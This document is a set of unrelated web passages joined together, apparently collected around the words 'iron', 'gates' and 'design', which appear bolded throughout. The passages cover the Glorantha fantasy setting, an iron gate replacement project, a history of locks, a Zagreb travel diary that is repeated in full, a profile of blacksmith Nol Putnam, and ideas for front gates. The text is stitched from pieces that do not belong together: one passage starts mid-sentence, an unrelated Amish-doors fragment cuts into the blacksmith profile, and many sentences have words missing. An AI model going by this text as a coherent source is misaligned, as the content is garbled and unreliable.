   <article>   <header>    <h1>Glorantha</h1>   </header>   <section>    <h2><strong>What is Glorantha?</strong></h2>    <p>Glorantha is the mythical world that can be found on the Other Side of our consciousness. First discovered by Greg Stafford over forty years ago, Glorantha has been explored in such games as Dragon Pass, RuneQuest, HeroQuest, and King of Dragon Pass.</p>    <p>Glorantha is a cube of earth some 5000 miles wide surrounded by the limitless Sramak&#x2019;s River. Above the world is the Sky Dome, where the stars and planets nightly dance across the heavens. Each morning the Sun emerges from the Gates of Dawn, and travels across the Sky Dome until it reaches the Gates of Dusk. The Sun then travels through the Underworld during the Night before remerging from the Gates of Dawn to begin a new Day.</p>    <p>The Inner World, the world of mortals, is shaped like a huge cube of earth floating in a limitless sea of water.&#xa0;Two major continents, named Genertela and Pamaltela, and a myriad of minor islands rise from this mass above the surface of the infinite sea.</p>    <p> is the northern continent of Glorantha. It is largely temperate in climate; its winds generally blow west to east, and often from the north during Dark Season. The continent is 3,125 miles long and 1,100 miles wide. The popular settings of , the Holy Country, the Lunar Empire, and Prax are all in Genertela.</p>    <p> is the southern continent of Glorantha. The continent is 4200 miles long and 2000 miles wide. Winds generally blow east to west, and occasionally from the hot south. Most of Pamaltela is tropical in climate. Although the Sun comes closer to Pamaltela in the winter and is further away in the summer, that does not mean the southern continent&#x2019;s seasons are reversed from those in Genertela, as the summer days are still longer and hotter, winter days cooler and shorter.</p>    <p>Although there are scores of human cultures in Glorantha, eight are most widespread.&#xa0;<span>The cultures are arranged by their predominant type of social organization: primitive, nomadic, chiefdom, or civilized. The most technologically advanced human cultures are comparable to our Bronze Age or Early Iron Age (without the iron). The eight cultures are: </span></p>    <ul>     <li>The primitive hunter-gatherers represented by the&#xa0;&#xa0;and the Doraddi&#xa0;cultures;</li>     <li>The nomadic pastoralists, represented by the Praxian culture;</li>     <li>The bronze-working tribal chiefdoms, represented by the&#xa0;&#xa0;culture; and</li>     <li>The urban civilizations, represented by the Pelorian,&#xa0;, Western, and Kralorelan cultures.</li>    </ul>    <h2>Elder Races</h2>    <p>The elder races of Glorantha include:</p>    <ul>     <li>The elves or&#xa0;&#xa0;&#x2013; walking sentient plants that have a superficial resemblance to humans;</li>     <li>The dwarves or&#xa0;<strong>Mostali&#xa0;</strong>&#x2013; immortal crafters that seek to repair the World Machine broken by the Gods War;</li>     <li>The trolls or&#xa0;<strong>Uz</strong>&#xa0;&#x2013; creatures of darkness descended from underworld demons and cursed by the gods of Light;</li>     <li>The&#xa0;<strong>Dragonnewts</strong>&#xa0; &#x2013; the mystic dragon-men who endlessly reincarnate with all their memories from their countless past lives.</li>    </ul>    <p>Although the current Gloranthan Time is believed by many to have begun only 1600 years ago, its mythology and history go back much further, for thousands or even millions of years. Although much of history is dependent on and colored by the local culture, some universal events are believed by many to have taken place. A group of magical philosophers called the God Learners spent centuries codifying the myths and history of Glorantha, and although they are now extinct and hated, the effects of their work can be felt in much modern scholarly work.<span>&#xa0;</span></p>    <p>Dragon Pass is destined to be&#xa0;central battleground for the Hero Wars and is a popular setting for Gloranthan games.</p>    <p>A brief overview of the city of Nochet,&#xa0;one of the greatest cities in Glorantha and ruled by queens and matriarchs.</p>    <p>In Glorantha, the gods and goddesses are real, and play an active and important part in most major events through their followers and cults. The Sun, the Earth, the Air, the Water, the Darkness, and the Moon all have powerful deities associated with them, as do powers such as Death, Life, Change, Stasis, Illusion, Truth, Disorder, and Harmony. There are lesser deities to such things as cats, cows, boats, vengeance, volcanoes, and more.</p>    <p>The provides an objective description of many of the major deities of Glorantha.</p>    <h3>Want more information?</h3>    <p>Search the wiki and consult the </p>    <p>Here are some links to start with:</p>    <ul>     <li>?</li>    </ul>   </section>   </article>

Also as you can see, the old gate wasn&#x2019;t square with the house and very structurally fatigued from its high ratio width. Below you can see how it started:</span>       </div>      </div>       <div>       <h2>Old Gate (Before)</h2>      </div>       <div>       <div>        <div>         <h3> Old wooden gate </h3>         <p> Dilapidated Old Gate </p>        </div>        <div>         <h3> Bent Hinges </h3>         <p> Hinges were bent on old gate, making it hard to open </p>        </div>        <div>         <h3> Wood Rot </h3>         <p> The old wood gate had started to rot </p>        </div>        <div>         <h3> Old Post Removal </h3>         <p> This post that was sunk into the concrete had to be removed prior to installing the iron replacement post </p>        </div>       </div>       </div>       <div>       <h2>New Gate (After)</h2>      </div>       <div>       <div>        <div>         <p> Gate when completed </p>        </div>        <div>         <h3> Latch System </h3>         <p> Custom fabricated latch system </p>        </div>        <div>         <h3> Gate Open </h3>         <p> Gate hinge system was designed to homeowner&#x2019;s request to swing outwards </p>        </div>        <div>         <h3> Latch </h3>         <p> Close-up of latch system </p>        </div>       </div>       </div>       <div>       <div>        <p><strong>Homeowner Testimonial </strong></p>        <p>We&#x2019;ve lived in our current home for almost twenty years, and the gate that we had attached to our side yard was another ten years old on top of that! After many years of sun damage and rot, it was well past due to replace our gate. Joel worked tirelessly on the custom design and sourced the materials quickly. Initially, we only had a rough idea of an iron gate, but Joel&#x2019;s artistic touch for rounding out the details came out beautifully in the final product. We couldn&#x2019;t be happier with our new gate and it certainly improved the overall look of our home.</p>        <strong>Maryann Santos</strong>       </div>       </div>      </div>     </div>    </div>   </div>

   <div>   <p>Keys and locks have been used by man for thousands of years. They&#x2019;re frequently mentioned in mythology and in the Bible. In fact, in , there&#x2019;s a reference to ancient <b>gates</b> being repaired in Jerusalem. In those days, the locks were huge and crude and were made of wood. However, they worked and served the same purpose as today&#x2019;s mechanisms.</p>   <p>When metalworkers and locksmiths gained more expertise in their trade, they started to make locks that were used by churches, cathedrals and royal courts in Europe. They created beautiful pieces of art, which regularly included religious motifs. (See this interesting historical tidbit from <em>A Gazetteer of Lock and Key</em> Makers:&#xa0;)</p>   <p>The oldest version of a mechanical lock was found in the ruins of a palace in Nineveh. This was widely used in Egypt, and is now commonly known as the . It used a crossbar attached to a pair of surface mounts that was entirely enclosed except for a tiny keyhole.&#xa0; It&#x2019;s considered to be the predecessor of the modern styles of locks we use today.</p>   <p>The Greeks had one&#xa0;that functioned by fastening the staple and wooden bolt to the inside of a door. A sickle-shaped wooden or <b>iron</b> key manipulated and lifted the bolt. Compared to the one made by Romans, this one&#xa0;offered little security.</p>   <p>The first metal lock was made by the Romans and was based on the principles of the Egyptian model. The Romans designed pins of different shapes with keyholes and keys. Many of these keys were sophisticated designs, such as flowers and birds. They also invented which, with alterations, are still being used today. Wards refer to projections near the keyhole, which prevent the turning of the mechanism&#xa0;when the wrong key is used. Romans also designed miniature keys that were worn as rings. All in all, these devices&#xa0;were pretty easy to choose.</p>   <p>In the 14th and 15th century, there were some considerable improvements in the locksmith industry but the designs and decorations didn&#x2019;t develop significantly. In that period, craftsmen excelled in metal work and in the <b>design</b> and production of fasteners, latches and devices&#xa0;for boxes, closets, doors and <b>gates</b>.</p>   <p>A lock that was considered a piece of art was not used for securing&#xa0;a door. It was specially designed and produced by a skilled locksmith or an <b>iron</b> tradesman to test his expertise and ability to create&#xa0;it. These types of latches&#xa0;were frequently displayed, and weren&#x2019;t covered so that people could see how they worked, the components of their mechanism, and their beautiful <b>design</b>.</p>   <p>At the beginning of World War II, in the 1940s, locksmiths were in great demand. Those working in the field during this era didn&#x2019;t get time to practice their trade, but primarily focused on the war. Some professionals&#xa0;continued to practice and many others were recruited into service.</p>   <p>Fast forward to today: Locksmiths learn their trade in many educational institutions and engineering departments all over the world. The best way to learn the trade&#xa0;in our area&#xa0;is to take offline and online courses, although you can start as an apprentice for a local company&#xa0;and learn while working. If you want to become a &#xa0;or any other town in the region, enroll for a training program online or at any of the&#xa0;vocational schools in TN.</p>   <p>Today, a Franklin professional&#xa0; on a certain skill (such as designing or working only on vehicles or working for a car company), works from his business premises (often working with door-related hardware, like frame repairs, closers, hinges, electric strikes, etc.), works as a security consultant, works for security institutions (such as designing and creating devices&#xa0;that guard against break-ins or theft), or works for investigation institutions (as a forensic locksmith).</p>   <p>See also: &#xa0;| </p>  </div>

   <div>     <p>We&#x2019;ve been to Croatia before &#x2013; in 2011 &#x2013; but didn&#x2019;t get as far as Zagreb so it&#x2019;s been on my list for a while. We mainly visited the coast: , and&#xa0; (which is&#xa0;one of my top sites in the world) and in Istria. We then went to , which I loved so it&#x2019;s a bit frustrating to be whizzing through Slovenia on the motorway without stopping especially as the sun&#x2019;s come out.</p>   <div>    <p>Whizzing past typical Slovenian countryside on the motorway</p>   </div>   <p>We&#x2019;re staying two nights in an apartment in Zagreb because there are practically no hotels in the centre. Parking also seems to be a problem but there is a cheap covered parking lot less than 10 minutes walk from the apartment which is another 10 minute walk in the other direction from the historical centre.</p>   <div>    <p>Our view from the little balcony of our apartment</p>   </div>   <p>This is not Italy as far as apartments go, but it&#x2019;s not the same price either. In Arqua Petrarca, we paid 100 euro a night against&#xa0;66 euro here. Our&#xa0;Aba Zagreb apartment is&#xa0;spacious and clean (except for the windows), the bed is comfortable, the shower head needs soaking in vinegar to unplug the clogged holes, the floor between the bedroom and bathroom is warped and cracks at night when you walk on it and there is only two or three of everything (cups, plates, etc.) but otherwise it&#x2019;s fine because we have our own vegetable peeler, kitchen knives and bread knife. I&#x2019;m not quite sure how the apartment&#xa0;got it&#x2019;s 9+ rating on&#xa0;booking.com!</p>   <div>    <p>Zagreb at dusk</p>   </div>   <p>By the time we get settled, it&#x2019;s dusk so we make for the old town.&#xa0;I always find that a bit of an adjustment is needed when we enter a former eastern block country because of the many contrasts between old and new, delapidated and renovated. Zagreb is no exception The historical centre is appealing though and we have a glass of wine&#xa0;near the market. &#x2013; the glasses are 0.10 l and there are no nibbles to go with them. Next to us, a&#xa0;dozen or so young women are obviously celebrating something and have a photographer with them.</p>   <div>    <p>Maybe a hens&#x2019; party?</p>   </div>   <p>We make a mistake about dinner and end up paying 60 euro in a restaurant recommended by Le Routard&#xa0;(Balthazar)&#xa0;as being &#x201c;medium priced&#x201d; and serving local dishes. My entr&#xe9;e is frankly awful but Jean Michel has delicious pasta and freshly picked boletus mushrooms. We then have a small&#xa0;entrec&#xf4;te with grilled vegetables accompanied by a house wine.</p>   <div>    <p>The &#x201c;caf&#xe9;&#x201d; street, Tklaciceva</p>   </div>   <p>It&#x2019;s next morning and we&#xa0;start with a cappuccino in the &#x201c;caf&#xe9;&#x201d; street , Tklaciceva, which was once a&#xa0;river separating the Kaptol and&#xa0;Gradec quarters.</p>   <div>    <p>The first female journalist in Croatia, Marija Juric Zagorka, 1887-1957</p>   </div>   <div>    <p>I love this little caf&#xe9; which seems to have grown out of the wall</p>   </div>   <div>    <p>A house and chapel just next to the cathedral hidden behind an <b>iron</b> fence</p>   </div>   <div>    <p>Zagreb cathedral</p>   </div>   <p>We go back to Zagreb Cathedral to visit the inside. It has led a chequered existence and was once at the mercy of the Ottaman invaders, which explains the towers on each side which are part of a fortified wall , the front part of which has been demolished.</p>   <div>    <p>The buildings on the other side of the cathedral square</p>   </div>   <div>    <p>Comparison of renovation and non-renovation</p>   </div>   <p>We return to Dolac market and are surprised to see so many local producers selling their own fruit and vegetables, We buy some figs, grapes and green beans from three different vendors.</p>   <div>    <p>Dolac market</p>   </div>   <p>We find a place for lunch called Nokturno that costs a quarter of last night&#x2019;s meal and is&#xa0;just as satisfactory. It&#x2019;s certainly &#x201c;local&#x201d; in any case.</p>   <div>    <p>We Markov Church</p>   </div>   <p>We walk up the hill to Saint Mark&#x2019;s with Parliament House on one side&#xa0;and Ban Palace on the other. Something is going on. There is a TV reporter and a small group of demonstrators. I hear the word &#x201c;discrimination&#x201d;. We go in search of a wrought-<b>iron</b> gate mentioned in our guide book and designed by Herman Boll&#xe9;. Just then a downpour begins and we duck under a porch. The weather forecast said overcast but no rain so we don&#x2019;t have an umbrella. Sigh.</p>   <div>    <p>The wrought <b>iron</b> gate designed by Herman Boll&#xe9;</p>   </div>   <div>    <p>Sweet corn sellers at the end of Tkalciceva street</p>   </div>   <p>We make a dash for a caf&#xe9; and have an espresso while waiting for the&#xa0;rain to stop. We talk about our next destination. This morning we had decided to drive to Split on the Adriatic and take the ferry across to Ancona in Italy, because of&#xa0;the current immigrant problems and the large number of border controls being restored in this part of the world but we now think we should go to Serbia anyway and resume our cycling itinerary along the Danube.</p>   <p>&#xa0;</p>   <div>    <p>The outside of our apartment building</p>   </div>   <p>We go home and check the weather forecast. We learn that the temperatures are going down in most places along the Danube in this area over the next few days, then going up again next week. So we book a hotel for a night on the Danube in Belgrade for an astonishing 31.50 euro. The Serbian capital is only about 3 hours away so we&#x2019;ll be able to cycle along the river and visit Belgrade by bike in the afternoon then move on further the next day, perhaps to Vidin where it&#x2019;s supposed to be warm and sunny.&#xa0;Keep tuned!</p>    </div>

   <div>     <p>We&#x2019;ve been to Croatia before &#x2013; in 2011 &#x2013; but didn&#x2019;t get as far as Zagreb so it&#x2019;s been on my list for a while. We mainly visited the coast: , and&#xa0; (which is&#xa0;one of my top sites in the world) and in Istria. We then went to , which I loved so it&#x2019;s a bit frustrating to be whizzing through Slovenia on the motorway without stopping especially as the sun&#x2019;s come out.</p>   <div>    <p>Whizzing past typical Slovenian countryside on the motorway</p>   </div>   <p>We&#x2019;re staying two nights in an apartment in Zagreb because there are practically no hotels in the centre. Parking also seems to be a problem but there is a cheap covered parking lot less than 10 minutes walk from the apartment which is another 10 minute walk in the other direction from the historical centre.</p>   <div>    <p>Our view from the little balcony of our apartment</p>   </div>   <p>This is not Italy as far as apartments go, but it&#x2019;s not the same price either. In Arqua Petrarca, we paid 100 euro a night against&#xa0;66 euro here. Our&#xa0;Aba Zagreb apartment is&#xa0;spacious and clean (except for the windows), the bed is comfortable, the shower head needs soaking in vinegar to unplug the clogged holes, the floor between the bedroom and bathroom is warped and cracks at night when you walk on it and there is only two or three of everything (cups, plates, etc.) but otherwise it&#x2019;s fine because we have our own vegetable peeler, kitchen knives and bread knife. I&#x2019;m not quite sure how the apartment&#xa0;got it&#x2019;s 9+ rating on&#xa0;booking.com!</p>   <div>    <p>Zagreb at dusk</p>   </div>   <p>By the time we get settled, it&#x2019;s dusk so we make for the old town.&#xa0;I always find that a bit of an adjustment is needed when we enter a former eastern block country because of the many contrasts between old and new, delapidated and renovated. Zagreb is no exception The historical centre is appealing though and we have a glass of wine&#xa0;near the market. &#x2013; the glasses are 0.10 l and there are no nibbles to go with them. Next to us, a&#xa0;dozen or so young women are obviously celebrating something and have a photographer with them.</p>   <div>    <p>Maybe a hens&#x2019; party?</p>   </div>   <p>We make a mistake about dinner and end up paying 60 euro in a restaurant recommended by Le Routard&#xa0;(Balthazar)&#xa0;as being &#x201c;medium priced&#x201d; and serving local dishes. My entr&#xe9;e is frankly awful but Jean Michel has delicious pasta and freshly picked boletus mushrooms. We then have a small&#xa0;entrec&#xf4;te with grilled vegetables accompanied by a house wine.</p>   <div>    <p>The &#x201c;caf&#xe9;&#x201d; street, Tklaciceva</p>   </div>   <p>It&#x2019;s next morning and we&#xa0;start with a cappuccino in the &#x201c;caf&#xe9;&#x201d; street , Tklaciceva, which was once a&#xa0;river separating the Kaptol and&#xa0;Gradec quarters.</p>   <div>    <p>The first female journalist in Croatia, Marija Juric Zagorka, 1887-1957</p>   </div>   <div>    <p>I love this little caf&#xe9; which seems to have grown out of the wall</p>   </div>   <div>    <p>A house and chapel just next to the cathedral hidden behind an iron fence</p>   </div>   <div>    <p>Zagreb cathedral</p>   </div>   <p>We go back to Zagreb Cathedral to visit the inside. It has led a chequered existence and was once at the mercy of the Ottaman invaders, which explains the towers on each side which are part of a fortified wall , the front part of which has been demolished.</p>   <div>    <p>The buildings on the other side of the cathedral square</p>   </div>   <div>    <p>Comparison of renovation and non-renovation</p>   </div>   <p>We return to Dolac market and are surprised to see so many local producers selling their own fruit and vegetables, We buy some figs, grapes and green beans from three different vendors.</p>   <div>    <p>Dolac market</p>   </div>   <p>We find a place for lunch called Nokturno that costs a quarter of last night&#x2019;s meal and is&#xa0;just as satisfactory. It&#x2019;s certainly &#x201c;local&#x201d; in any case.</p>   <div>    <p>We Markov Church</p>   </div>   <p>We walk up the hill to Saint Mark&#x2019;s with Parliament House on one side&#xa0;and Ban Palace on the other. Something is going on. There is a TV reporter and a small group of demonstrators. I hear the word &#x201c;discrimination&#x201d;. We go in search of a wrought-iron gate mentioned in our guide book and designed by Herman Boll&#xe9;. Just then a downpour begins and we duck under a porch. The weather forecast said overcast but no rain so we don&#x2019;t have an umbrella. Sigh.</p>   <div>    <p>The wrought iron gate designed by Herman Boll&#xe9;</p>   </div>   <div>    <p>Sweet corn sellers at the end of Tkalciceva street</p>   </div>   <p>We make a dash for a caf&#xe9; and have an espresso while waiting for the&#xa0;rain to stop. We talk about our next destination. This morning we had decided to drive to Split on the Adriatic and take the ferry across to Ancona in Italy, because of&#xa0;the current immigrant problems and the large number of border controls being restored in this part of the world but we now think we should go to Serbia anyway and resume our cycling itinerary along the Danube.</p>   <p>&#xa0;</p>   <div>    <p>The outside of our apartment building</p>   </div>   <p>We go home and check the weather forecast. We learn that the temperatures are going down in most places along the Danube in this area over the next few days, then going up again next week. So we book a hotel for a night on the Danube in Belgrade for an astonishing 31.50 euro. The Serbian capital is only about 3 hours away so we&#x2019;ll be able to cycle along the river and visit Belgrade by bike in the afternoon then move on further the next day, perhaps to Vidin where it&#x2019;s supposed to be warm and sunny.&#xa0;Keep tuned!</p>    </div>

   <div>   <div>    <p>photography by ADAM EWING</p>   </div>   <p>HUNTLY, VIRGINIA<strong> &#x2013;</strong>&#xa0;Nol Putnam forges wind from <b>iron</b>, his hammer&#xa0;metronomic at 2&#xbd; strikes a second, steel against <b>iron</b> against anvil. The angle of the peen and the force of his follow-through shape hot metal the way a rolling pin pushes pastry.</p>   <p>Putnam, 80, has been creating art from <b>iron</b> for more than 40 years. His hands are strong, his shoulders broad, his hearing damaged by the clang and the clatter. Flying sparks have burned constellations into his beret and shards of metal have scarred his skin, yet he awakens each day excited to return to his fire.</p>   <p>Hot like this, the crystalline molecules of the metal slide past one another and re-form under Putnam&#x2019;s tools as delicate petals and leaves, or as soaring swoops and swirls that cantilever out over broad bases. In the sculpture garden outside his White Oak Forge in Huntly, Virginia, 90 minutes north of Charlottesville on rollercoaster roads, the 7-foot-tall&#xa0;<em>West Three Wind</em>&#xa0;circles back on itself three times before shooting back through all three layers and off toward the distant sky. It is part of his series&#xa0;<em>Lines In Space,</em>&#xa0;some of the sculptures man-sized and some small enough to sit on a table, and all inspired by the childhood books by Thornton Burgess, whose Old Mother West Wind is depicted as lines that eddy off toward the horizon.</p>   <p>&#x201c;When you&#x2019;re doing something like that you have to worry about not just the physical engineering of how it&#x2019;s going to stand up and who&#x2019;s going to come play on it,&#x201d; Putnam says, &#x201c;but then how is that negative space or the space you&#x2019;ve defined going to look to the eye?&#x201d;</p>   <p>The sculpture weighs about 400 pounds, yet Putnam made it alone, heating the metal in his 3,000-degree forge, drawing the curves in chalk on the primitive platen table and bending the metal to meet them, then pounding it with both a mechanical air hammer and his own strength and persistence. For weeks he shaped component parts, then lay each out on blocks on his smithy floor, sometimes using a crane to manipulate them into position, sometimes welding them to the bucket of his tractor in order to keep them in place.</p>   <p><strong>Today he is working with</strong>&#xa0;pure <b>iron</b> imported from England &#x2013; &#x201c;like forging butter, relatively,&#x201d; he says, using tongs to hold a finger-width rod into the fire. Pure <b>iron</b> has a fibrous grain like that of wood, which makes it easy to stretch and bend and shape. Add a little carbon into the latticework of the <b>iron</b> and you create steel, a material much stronger but also more rigid, and thus harder to transform into items of delicate beauty.</p>   <p>Putnam turns a rheostat that controls a fan that blows air through the hot coals, the bellows long gone. He pushes the green coal to the edges of the fire with a toothless rake and pulls more coke toward the center. The rake was the first tool he ever made, and he uses it every day, all day, its handle smooth in his calloused palm. On the side of the forge are a pair of tongs he made himself, and a pair given to him by his mentor. There&#x2019;s a center punch, too, salvaged from the smithy of his best friend when he died half a decade back.</p>   <p>The <b>iron</b> glows red, itself nearing 2,200 degrees, and Putnam carries it to the anvil and begins his rhythmic pounding, each strike precise.</p>   <p>&#x201c;People come in and say, &#x2018;Oh, you&#x2019;re such an artist,&#x2019; which is very flattering,&#x201d; he says, &#x201c;but what they don&#x2019;t understand is that it&#x2019;s about 90 percent practice and only 10 percent genius. In any profession you develop the skill by practice, and that&#x2019;s what most people don&#x2019;t do.&#x201d;</p>   <p>Indeed, his former mentor would give beginners a two-by-four with an X drawn on one end, and only when they could hit the X each time with the center of their hammer were they allowed to work with <b>iron</b>.</p>   <p>Putnam strikes the end of the rod 43 times to bring it to a point, then&#xa0;returns it to the fire.</p>   <p>Both the building and the fire that is the heart of the building are called forges, although the building can also be called a smithy. This is Putnam&#x2019;s&#xa0;seventh, the <b>design</b> winnowed by him from what worked in the ones that came before. There are skylights over the anvil for natural light, and broad windows that frame birds and trees and the pond that separates his workshop from his home. The chimney rises 22 feet &#x2013; the higher the chimney, the better the draw; the better the draw, the hotter the fire. The Venturi effect pulls ash and smoke up the chimney and out of the shop. The floor is 4-inch-thick reinforced&#xa0;concrete; his pneumatic hammer sits on a massive block of wood that rests on its own 4-foot cube of concrete, set deeper than the building&#x2019;s footers so that the vibration of the machine won&#x2019;t set up a resonance that will crack the floors and 12-foot-tall walls.</p>   <p>The beam-mounted crane is 2 feet higher still, giving Putnam room to manipulate long lengths of <b>iron</b> without bashing lights or banging the&#xa0;ceiling. Hundreds of hammers hang next to the forge, the handles of his favorites smooth from use. Nearby are racks of U-shaped forms, some narrow, some wide, designed sometime along the 3,000-year history of man&#x2019;s manipulation of metal. The bottom half of the form is designed to fit into a slot in the anvil; the upper form has a hole for a handle like a hammer&#x2019;s. In a two-person shop the upper form is held by the blacksmith while an apprentice strikes it from above, squeezing and shaping the hot metal inch by inch. In Putnam&#x2019;s shop the striking is done by his pneumatic hammer &#x2013; his mechanical apprentice &#x2013; a machine so brutish it can crush metal, yet with Putnam&#x2019;s trained toes on the air pressure level is gentle enough to close a matchbox without crushing a corner.</p>   <p>Putnam pulls the red metal again from the fire and aligns it under the head of the massive air hammer. Pound after pound it flattens the metal into a lozenge, a flat lollipop on its way to becoming a leaf, its color fading from orange to gray.</p>   <p>&#x201c;This is where it&#x2019;s dangerous,&#x201d; he says, holding the back of his hand over the piece to confirm. The color is gone but the temperature still hovers at about 1,000 degrees. He sticks the metal back into the fire.</p>   <div>    <p>photography by ADAM EWING</p>   </div>   <p>Nol Putnam grew up on a farm,&#xa0;working with his hands. He adored three-dimensional geometry, and lived a life rich with books and&#xa0;music. He became a teacher of&#xa0;history and the creator of cultural bridges between incoming Native American students and the faculty of a western Massachusetts boarding school. He was in his late 30s when he read a library book on blacksmithing and used it and his dad&#x2019;s hammer &#x2013; plus a lot of self-described stubbornness &#x2013; to begin his new career. In his first decade he paid his dues making hooks and andirons and fireplace tools, then standing in heat and rain and cold at craft fairs, peddling his wares.</p>   <p>In the next decade he turned his tools to architectural and structural work &#x2013; balconies and railings and ornate <b>iron</b> <b>gates</b> of steel and copper and brass. The ideas come to him in dreams, fully formed; his job then is to awaken and capture them onto bedside paper and then to translate those sketches into something clients can understand.</p>   <p>For the Rockefeller family he forged brass into a 16-foot-wide gate adorned with a delicate tree. For what he called his &#x201c;Rousseau Gate&#x201d; he created nine leaves, 3 and 5 and 8 feet tall. For each commission he visits the site, talks with the clients about their vision, then returns later with two sketches. He could make more, but the conversations would then be complicated.</p>   <div>   <p>AMISH CUSTOM DOORS / WROUGHT IRON / BLACKSIMITH WORK</p>   <p>THIS PORTION OF OUR SITE IS A TRIBUTE TO THE EARLY BLACKSMITHING ARTISAN &amp; PIONEERS</p>   <p>THE FIRST ARTISAN WE WANT TO FOCUS ON IS LEGENGDARY CHARLESTON SC BLACKSMITH PHILIP SIMMONS WHOSE BODY OF WORK IS RECOGNIZED AROUND THE WORLD AS THE GOLD STANDARD &#xa0;!!

   <p>&#x201c;I encourage clients to mark up the drawings, to say yea and nay, to tell me what they like and don&#x2019;t,&#x201d; he says. &#x201c;I don&#x2019;t like commission work to simply be an exchange of money. I prefer for the clients to be part of the process, even to the point of coming down and taking a ceremonial whack just to see what it&#x2019;s like. Then the whole piece becomes more meaningful for everybody.&#x201d;</p>   <p>Now he pulls the flat leaf from the fire and draws a mental line down its center, then hammers on one side of it and then the other.</p>   <p>&#x201c;See the line down the middle?&#x201d; he says. &#x201c;Now I&#x2019;m going to put some veins it and then whiffle it so it look like it has some life.&#x201d;</p>   <p>He returns it to the fire.</p>   <p>Putnam forged 250 petals and leaves&#xa0;of a much heavier <b>iron</b> for a pair of <b>gates</b> that hang in the National Cathedral in Washington. The ornate Folger Gate, installed in 1995, frames the entryway to the columbarium in the Chapel of St. Joseph of Arimathea. Nearby hangs Putnam&#x2019;s Brown Gate, and behind that the ashes of ambassadors and bishops, architects and musicians, but also those of Helen Keller and her caregiver, Annie Sullivan.</p>   <p>&#x201c;It&#x2019;s a beautiful building, but it&#x2019;s a little overwhelming to think about being there,&#x201d; he says.</p>   <p>He got the job through word of mouth, and&#xa0;began work with nothing more than a handshake. For the next year and a half he worked &#x2013; 1,200 hours of forming flowers and forging the frame. The pistil on each flower and the rivets that connect the crosspieces are all different; one depicts the face of Yoda from&#xa0;<em>Star Wars</em>.</p>   <p>The <b>gates</b> had to meet specifications for how they hung in the arched entryway, and they had to open and close, and latch smoothly. Beyond those parameters Putnam was free to <b>design</b> to his own vision.</p>   <p>&#x201c;I was just really fortunate &#x2013; that I was given the chance and that I could rise to the occasion,&#x201d; he says. &#x201c;Fortunately, I think it&#x2019;s some of the best work I ever did.&#x201d; The <b>gates</b> are considered to be part of the fabric of the building, the things that give life to the structure: the stone carvings, the windows, the tapestries, the ironwork &#x2013; everything that gives it texture.</p>   <p>He was hired by Canon Richard T. Feller, the longtime and well-known Clerk of the Works &#x2013; chief administrator in charge of all construction and artwork for the cathedral, the sixth-largest in the world.</p>   <p>&#x201c;He was a serious man who took his work very seriously and demanded that everybody else do the same,&#x201d; Putnam says. &#x201c;It made him sometimes difficult to work with. I didn&#x2019;t particularly have a problem with it, but he held your nose to the grindstone in order to get your best work, and it was a valuable lesson.&#x201d;</p>   <p>In the midst of that work, another office of the cathedral called. Former President Gerald Ford was ill, and if he died he would come to the cathedral to lie in state, yet all the cathedral owned were four &#x201c;tacky, wobbly wooden candlesticks,&#x201d; Putnam says. &#x201c;They called me up, desperate, and said, &#x2018;Please please, we need this immediately!&#x2019; &#x201d;</p>   <p>There are few emergencies in artisanal blacksmithing, nor can things easily be rushed. Luckily, President Ford did not die at that time, but the candlesticks, tall and simple and reflective of some of the patterns in the stonework, still stand sentinel.</p>   <p><strong>Putnam pulls the leaf from the fire</strong>&#xa0;and holds it on the forward-pointing cone of the anvil. He taps the metal with his hammer, twisting the leaf until it looks blown by the wind. Then he positions a chisel-like hardy upright in the tool slot of the anvil, lays the leaf&#x2019;s stem across the hardy&#x2019;s edge and takes four solid whacks, slicing nearly through the stem. It is poor form, he says, to cut all the way through and send the hot metal shooting across the shop. Years ago a piece broke loose and whacked him on the head and knocked him out cold.</p>   <p>He clamps the leaf to a workbench and uses a screaming electric grinder to blunt the sharp edge, then holds the leaf and a stamp of his initials under the head of a foot-powered hammer &#x2013; a tool invented in Michelangelo&#x2019;s day &#x2013; and stomps, impressing his initials into the stem, then buffs the leaf with a spinning wheel of wire bristles. Last, he paints it with his homemade elixir of turpentine, linseed oil and beeswax, and buffs it dry.</p>   <p>&#x201c;Now imagine doing all those steps to every component of the cathedral gate,&#x201d; he says, as he holds up the completed leaf.</p>   <p>&#x201c;Patience is a virtue,&#x201d; he says, his voice as&#xa0;cadenced as his hammer, &#x201c;seldom in a woman &#x2026; never in a man &#x2026; but always in a blacksmith.&#x201d;</p>   <p><em>inally published in&#xa0;,&#xa0;May 10, 2014</em></p>  </div>

   <div>   <h1>5 Fabulous Ideas For Your Front Gate</h1>   <p>The gate is guests&#x2019; invitation to your home. However, it also serves the practical purpose of securing your yard. Either way the front gate is visible from the street, and therefore it offers both visitors and passersby their first impression of your home. Choose a customized gate as the welcome you want to extend.</p>   <p><strong>Custom Gate</strong></p>   <p>If you want to give your home a grand entrance, consider a custom gate. Contractors have many methods for customizing a gate. For example, you could select a simple wooden panel gate with your family initials etched in. Alternatively, consider a custom <b>iron</b> gate with a picture worked into the <b>design</b>. Another option is a sculptural <b>iron</b> gate made of mixed materials such as wood and steel. Manufacturers can even create a gate that looks like bubbles, fire or some other natural substance &#x2013; let your imagination guide you.</p>   <p><strong>Gate Makeover</strong></p>   <p>Another way to customize your garden gate is by giving a basic model a makeover. suggests starting with a basic wooden gate and painting it. You can have it painted a bold color or ask for a faux painting technique that makes it look old or mossy. Likewise, change out the hardware to conform with your vision. Replace new hardware with antique models, or go ornate.</p>   <p><strong>Trellis Topper</strong></p>   <p>In the same vein, contractors often use trellis panels to make over a basic wooden gate. You could start with a rectangular model and have a geometric panel added on top for a modern appeal. Or have a full circle trellis added to the top. For a more classic look, start with an arched wooden gate, and add a panel that echoes this shape. The trellis panel can even be in wrought <b>iron</b>, which offers a charming complementary profile.</p>   <p><strong>Geometric Gate</strong></p>   <p>Speaking of geometry, if you have a contemporary home, consider a gate with geometric style. Imagine a rectangular gate with a large circle built into the center. The circle can feature a series of squares that echo a panel on top. The construction can be an update on basic wrought <b>iron</b>. Peruse your contractor&#x2019;s catalog for options, or customize a gate with the geometry that complements the fa&#xe7;ade of your home.</p>   <p><strong>Romantic Arbor</strong></p>   <p>If your front gate opens right into a garden, a romantic arbor is an excellent addition. This works well with either a picket or <b>iron</b> gate. Have the arbor built over the gate, and plant climbing flowers at the base to grow over the top. Flowers such as morning glory offer a delicate look, while bougainvillea creates more privacy.</p>   <p>Let your customized front gate serve as the transition between the street and your home.

